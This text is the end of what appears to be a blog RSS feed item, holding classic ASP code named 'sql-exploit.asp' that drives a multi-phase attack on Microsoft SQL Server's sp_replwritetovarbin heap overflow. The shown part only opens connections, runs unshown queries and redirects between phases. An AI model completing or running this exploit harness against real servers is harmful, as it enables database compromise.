oConnection.Open "Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=" &amp; UserName &amp; "; Password=" &amp; Password
Set rs = Server.CreateObject("ADODB.Recordset")

phase = Request.Querystring("p")

if phase then
	if phase = 1 then
		rs.open SQL3, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect("sql-exploit.asp?p=2")
	elseif phase = 2 then
		rs.open SQL4, oConnection
		rs.close
		oConnection.Close
		Set oConnection = Nothing
		Response.Redirect("sql-exploit.asp?p=3")
	end if
Else
	rs.open SQL, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing
	
	Set oConnection = Server.CreateObject("ADODB.Connection")
	oConnection.Open "Provider=SQLOLEDB; Data Source=; Initial Catalog=; User ID=" &amp; UserName &amp; "; Password=" &amp; Password
	Set rs = Server.CreateObject("ADODB.Recordset")
	rs.open SQL2, oConnection
	rs.close
	oConnection.Close
	Set oConnection = Nothing	

	Response.Redirect("sql-exploit.asp?p=1")
end if


%&gt;</pre></div></div>

]]></content:encoded>
			<wfw:commentRss>/index.php/datamgmt/datadesign/sp_replwritetovarbin-heap-overflow-code/feed/</wfw:commentRss>
		<slash:comments>5</slash:comments>
		</item>
	</channel>
</rss>
